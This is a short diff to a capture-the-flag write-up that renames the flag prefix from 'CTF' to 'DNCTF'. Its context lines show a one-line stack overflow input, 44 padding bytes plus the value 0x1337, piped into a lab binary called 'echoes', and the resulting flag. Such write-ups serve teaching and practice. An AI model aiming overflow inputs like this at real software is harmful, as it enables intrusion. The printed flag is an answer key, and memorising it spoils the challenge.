@@ -77,13 +77,13 @@ p.interactive()
 $ printf '%s' "$(python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+(0x1337).to_bytes(4,'little'))")" | ./echoes
 
 [+] Access granted!
-[+] Flag: CTF{echoes_are_not_always_safe}
+[+] Flag: DNCTF{echoes_are_not_always_safe}
 ```
 
 ## 5. Flag
 
 ```text
-CTF{echoes_are_not_always_safe}
+DNCTF{echoes_are_not_always_safe}
 ```
 
 ## 6. Why this matters
